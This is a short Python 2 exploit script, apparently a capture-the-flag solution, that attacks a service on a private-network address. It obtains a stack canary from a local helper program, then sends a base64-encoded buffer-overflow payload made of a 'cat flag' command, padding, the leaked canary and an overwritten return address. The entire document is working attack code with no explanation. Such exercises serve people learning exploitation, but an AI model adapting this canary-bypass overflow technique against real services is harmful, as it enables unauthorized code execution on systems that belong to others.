#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *
import base64
import subprocess

ip = '10.211.55.48'
port = 4321

io = zio((ip, port), timeout = 10000, print_write = COLORED(REPR))

p = subprocess.Popen('./getcookie', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
cookie = int(p.stdout.readline().strip('\n'), 16)
log(hex(cookie), 'yellow')

io.read_until("base64'd:")

cmd = "\x00cat flag"
payload = cmd + '\x00'*(128-len(cmd)) + b32(cookie) + '\x00'*12 + l64(0x4010D0)

io.writeline(base64.b64encode(payload))
io.read()
